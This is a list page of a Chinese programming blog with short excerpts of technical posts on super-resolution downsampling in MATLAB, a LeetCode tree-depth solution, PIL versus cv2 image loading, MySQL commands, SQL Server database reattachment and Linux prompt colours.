在这四种降质类型中，BI与BD是最常见的两种降质类型，而针对BN和DN的研究相对较少。而针对BI与BD两种降质的研究则属BI更多。
BI实现 接下来，我们将简单的介绍一下上述四种降质类型是如何实现的。首先，我们来看一下BI。做CV的同学对Bicubic应该非常熟悉，可以轻松的采用OpenCV或者PIL等库图像的双三次插值。但是，这里大家需要特别注意：BI一般特指matlab中的imresize。OpenCV与MATLAB在imresize的实现上是有区别的：matlab中的imresize具有抗锯齿功能，而OpenCV中的resize则不具备上述功能。关于matlab如何制作数据，可以参考BasicSR。这里附上关键性代码。
sclae = 4 image_path = "butterfly.png" image = imread(image_path) image = im2double(image) image = modcrop(image, scale) imgLR = imresize(image, 1/scale, 'bicubic') function image = modcrop(image, scale) if size(img, 3) == 1 sz = size(img); sz = sz - mod(sz, scale) image = image(1:sz(1), 1:sz(2)) else tmpsz = size(img); sz = tmpsz(1:2) sz = sz - mod(sz, scale) image = image(1:sz(1), 1:sz(2)) end end 也许有同学会说，都2020年了，谁还会用MATLAB啊，有没有Python版的呢？这里提供两个基于Pytorch与matlab相当的imresize。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4842f383c1e62d15fc88c60d5d6a6991/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d816f2a9912011f425b6405fed1f0d2/" rel="bookmark">
			LeetCode题库 104. 二叉树的最大深度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 给定一个二叉树，找出其最大深度。
二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。
说明: 叶子节点是指没有子节点的节点。
示例：
给定二叉树 [3,9,20,null,null,15,7]，
3
/ \
9 20
/ \
15 7
返回它的最大深度 3 。
代码：
/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public int maxDepth(TreeNode root) { if(root==null) return 0; return Math.max(maxDepth(root.left),maxDepth(root.right))+1; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfd588fad0be79808bbd1f2abfcad166/" rel="bookmark">
			PIL和cv2读取图片时的差异
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天要写的代码涉及到数据增强的部分，因为我用的框架是pytorch，想着如果直接有数据增强的函数直接用就好了，省的写了，查了一下确实有，就在torchvision的tranform中，但是这里面对于图像的变化都是针对于PIL图像的，而我之前对于图片的操作都是用的给cv2，就稍微看了一下PIL的用法，再加上函数，图像增强的部分算是搞明白了。
但是在我训练完之后，要预测时，因为要计算混淆矩阵，但是老出错误，往回寻找错误才发现问题。
混淆矩阵计算时，真值和预测值所对应的标签都是一致的，比如我是两分类，预测的结果是0和1，而label因为随着样本图像做过数据增强，所以它也是经过PIL处理的，我就打开label的值看了一下，居然是0和0.0032，试验了很多遍，确实是因为PIL打开图片的原因，我本来在考虑按照哪个格式来，分析了一下，肯定是整数来代替类别比较方便，所以我决定想办法将PIL打开的后的图片经过变化之后，能转成cv2打开的那个样子。
查了一下，说PIL打开图片是”RGB“方式，而cv2打开是”BGR"方式，难道这个导致了像素值的变化？我以为这两种打开方式只是改变了宽高，可惜PIL也没有以“BGR”打开的方式，也不能比较一下值变化是不是因为这个。
将PIL转成numpy或者tensor如果用那种常见的方式依旧不行，欸，我看到了一个这样的转换方式np.asanyarray()，试了一下，果真，那些个0.0039变成了1，总算解决了一个问题了。
本来我在训练的时候发现loss值相比于之前训练的特别低，还以为数据增强这么管用，原来是因为数据增强让我的label变得那么小，所以loss值才那么低的......现在改完了，重新跑一下看看数据增强的作用吧~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca8cf6d925136e2d926e6cb8390168eb/" rel="bookmark">
			cad字体安装_2505种CAD字体库大全，神级字体汇总！从此做图再也不乱码！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CAD字体乱码是一个很头疼时的事情，当我们打开的CAD图纸里面包含了一些我们电脑上没有安装的字体文件时，打开之后那些使用了特殊字体的文字就会变成一个个问号，或者字体发生变形、乱码，图纸布局也会变得十分难看。安装了这套CAD字体库大全之后，就再也不用担心这样的问题出现了。
CAD字体库大全共包含2505款字体文件，基本上CAD的常用字体里面都有。该字体库安装简单，下载完成后把字体文件解压到CAD根目录下的Fonts文件夹即可。可按自己的需求选择使用。
【文末免费领！】
下载后解压
全部2505种字体
安装方法： 直接将所有字体复制到Auto CAD的/Fonts下。
也可复制到C:WINDOWS/Fonts，增加电脑上的字体。
一些常见问题及解答 1.为什么在安装时会出现"文件损坏"?
答：这是因为字库与您的系统产生冲突（特别是xp系统，因为有很多字体以前都是在win98或更早的版本下开发的）。
2.为什么安装完字体后我在使用时找不到?
答：有些字体：例如华康系列的。他们在列表显示为他的相关拼音代码，您可以在下载回来时双击字体可以看到这个字体的名字是什么。然后在选择使用这个字体时，就请选他的拼音字，就是您要的字体了。
3.为什么有些字体的字打不出来?
答：有些字库必须要在繁体输入的情况下才能打出来的（例如金梅字库等），如果使用繁体输入法输入的文字依然无法出来，可能是字体的字库不全，是没办法打字这个字的。
4、如何卸载字体？（电脑上的字体）
1.以Windows7为例。打开控制面板，找到字体，点击进入。
2.在右上方搜索栏可搜索想要删除的字体（以宋体为例），找到后选择字体，即可进行预览、删除、隐藏的操作。
老刘提供的这套2505种CAD字体库大全，绝对不会让大家失望的，真心希望能帮助大家解决问题！
【详情戳下图！】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/878c9dda90191a6ef869324a7c34f20c/" rel="bookmark">
			Mysql常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mysql常用命令行大全 3.1 登录mysql
mysql -uroot -p //输入 密码+回车 //1. 操作数据库 show databases; //显示 显示数据库列表 //2. 显示 库中的数据表 use mysql; show tables; //3. 显示数据表的结构： describe 表名; //4、 建库与删库： create database 库名; drop database 库名; //5、 建表： use 库名; create table 表名(字段列表); drop table 表名; //6、 清空表中记录： delete from 表名; //7、 显示表中的记录： select * from 表名; 3.2 导出和导入数据 导出数据： mysqldump --opt test &gt; mysql.test 即将数据库test数据库导出到mysql.test文件，后者是一个文本文件 如：mysqldump -u root -p123456 --databases dbname &gt; mysql.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/878c9dda90191a6ef869324a7c34f20c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c94c50a96322515caf7bf91b729f0c52/" rel="bookmark">
			Android uvccamera摄像头Could not resolve com.serenegiant:common:2.12.4 解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 buildscript { repositories { maven { url 'https://gitee.com/liuchaoya/libcommon/raw/master/repository/' } google() maven { url 'https://maven.google.com' } jcenter() } dependencies { classpath 'com.android.tools.build:gradle:3.1.4' } } allprojects { repositories { maven { url 'https://gitee.com/liuchaoya/libcommon/raw/master/repository/' } google() maven { url 'https://maven.google.com' } jcenter() //	maven { url 'http://raw.github.com/saki4510t/libcommon/master/repository/' } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cefb8aa8290a0b4cfddf3f88bf5a2a3c/" rel="bookmark">
			ResNet
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么引入残差网络？ 我们可能会想到网络越深拟合越好，然而并非如此，很深的网络很容易导致网络退化问题，增加shortcut mapping有利于梯度传播。加入直连部分，可以使得梯度从后向前传播，网络扩展到上千层。
warm up 用一个较大的模型训练时，采用较小的学习率（小于一般状况下10倍的学习率）预热模型一个epoch步，随后增大学习率。
网络 开始迅速降低分辨率四阶段残差结构池化 + RC输出
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d6151f46cbd7ea1acaa1421a52e483e/" rel="bookmark">
			由于文件不可访问，或者内存或磁盘空间不足，所以无法打开数据库 ‘msdb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于文件不可访问，或者内存或磁盘空间不足，所以无法打开数据库 ‘msdb’。有关详细信息，请参阅 SQL Server 错误日志。 (Microsoft SQL Server，错误: 945)
在给数据库改名和编辑的时候，随便改了一些设置， 玩了玩，结果遇到这个问题，也搜索到了大哥的贴子，受到启发，虽然没解决我的问题，然后继续百度
由于文件不可访问，或者内存或磁盘空间不足，所以无法打开数据库 ‘msdb’…
我也是打开数据库遇到标题这个问题，但是我不是mdf、ndf、ldf没了。我的是还在的，可能改名他有些没改到。连接不回去了。
一开始吓我的是 连 我保存好的 查询语句 全没了。
因为我的数据文件都在，就一个ndf和ldf文件。接下来搜到了解决办法。
只有mdf文件和ldf文件，怎么恢复数据库
我是在navicat操作，用语句直接重新建库，就连上了，解决了问题。
不想重删我的库了，害怕…
做个测试
建个表填两个数
此时DATA文件夹的数据库文件出现了。
做了一些改名的操作
很奇怪，还能连上。那么先关掉连接，再把这里删库
文件没了…还是要备份一下的。。
备份的时候还是有些新的问题
接下来把服务先关掉，以便把文件移动一下
把文件移动到了桌面，再把服务打开
这下就打不开了
既然打不开了，我们把这里的库记录删了，接下来写连接语句，根据文件路径重连。
use master go create database harryfooty on (filename="E:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\harryfooty.ndf"), (filename="E:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\harryfooty_log.ldf") for attach go 成功重连回丢失连接的表
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0f828bd4a93f1f63fe245eca45d68a2/" rel="bookmark">
			ART-Pi STM32H750 开发板，运行led程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 安装 rt-thread studio 开发工具
2. 新建工程：
点击 文件 ---新建---RT thread 项目 填写项目名称、选基于开发版、选开发板的型号、选类型为示例工程、选示例的名称，选调试器为 st-link, 点击完成，如下图所示：
3. 如果开发板的列表里，没有STM32H750-RT-ART-PI，点击添加更多，添加，
分别装上资源包，如下图所示：
4. 点击编译按钮
5. 开发板接电脑的usb口，点 下载程序 按钮
6. 如果一切正常，开发版上的led蓝灯，会不停闪烁
这个过程中，会出现的问题：
1. 这个错误是路径问题，D:\RT-ThreadStudio\repo\Extract\Debugger_Support_Packages\STMicroelectronics\ST-LINK_Debugger\1.2.0的文件夹没有，1.4.0的文件夹是有的， 点击 调试配置 按钮，修改路径，如下图：
选 debugger，点击 browse 按钮，修改路径为 1.4.0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fe82730a910984c825948f0fb61c77d/" rel="bookmark">
			【Linux】Linux终端如何修改命令提示符 &amp; 推荐的提示符配色方案？（20201029亲测有效）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		命令提示符：prompt 范例：
[root@localhost ~]#
test@ubuntu1804:~$
# 管理员
$ 普通用户
显示提示符格式 Centos中的提示符格式：
Ubuntu中的提示符格式：
修改提示符格式 提示符格式说明 \e 控制符\033
\u 当前用户
\h 主机名简称
\H 主机名
\w 当前工作目录
\W 当前工作目录基名
\t 24小时时间格式
\T 12小时时间格式
! 命令历史数
# 开机后命令历史数
修改提示符格式范例：2个优秀案例（且一般个人用的话，直接在全局修改即可。） 案例1：字体闪烁型配色方案（高亮显示，不建议。）
PS1="\[\e[1;5;41;33m\][\u@\h \W]\\$\[\e[0m\]" 注意：
1代表高亮显示；
5代表闪烁；
41是背景颜色；（41-41都是不同的颜色；42绿色，44蓝色）
案例2：常规型配色方案
最终优化的几种方案如下： 33是字体颜色； 32:绿色 PS1="\[\e[1;32m\][\u@\h \W]\\$\[\e[0m\]" # 推荐颜色 33:黄色 PS1="\[\e[1;33m\][\u@\h \W]\\$\[\e[0m\]" # 推荐颜色 34:蓝色 PS1="\[\e[1;34m\][\u@\h \W]\\$\[\e[0m\]" # 推荐颜色 35:紫色 \
案例3：带时间的配色方案
PS1="\[\e[1;32m\][\t \[\e[1;33m\]\u\[\e[35m\]@\h\[\e[1;31m\] \W\[\e[1;32m\]]\[\e[0m\]\\$" 或者 echo 'PS1="\[\e[1;32m\][\t \[\e[1;33m\]\u\[\e[35m\]@\h\[\e[1;31m\] \W\[\e[1;32m\]]\[\e[0m\]\\$"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fe82730a910984c825948f0fb61c77d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/228/">«</a>
	<span class="pagination__item pagination__item--current">229/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/230/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>